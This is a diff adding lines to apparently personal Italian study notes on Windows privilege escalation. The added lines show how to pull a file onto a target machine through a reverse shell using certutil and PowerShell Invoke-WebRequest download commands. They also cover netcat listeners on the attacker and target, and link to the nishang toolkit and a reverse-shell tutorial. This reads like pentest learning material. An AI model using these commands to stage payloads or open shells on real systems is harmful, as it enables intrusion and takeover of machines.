@@ -86,7 +86,20 @@ Access Token
 icacls
 MIC
 UAC
+-------------
+per trasferire, usando una reverse shell , un file dall'esterno dentro la macchin atarget
+certutil -urlcache -split -f <URL SOURCE> <OUTPUT FILE>
 
+da power shell
+iwr invoke webrequest
+iwr -uri <URL> -Outfile <OUTPUT FILE>
+Invoke-WebRequest -uri <URL> -output <OUTPUT FILE>
+
+nc running sull'attacker
+nc64 running sul target
+
+https://github.com/samratashok/nishang/tree/master
+https://github.com/LeonardoE95/yt-en/tree/main/src/2024-07-10-windows-privesc-windows-reverse-shells
 
 ##############################################à
 https://learn.microsoft.com/en-us/sysinternals/downloads/
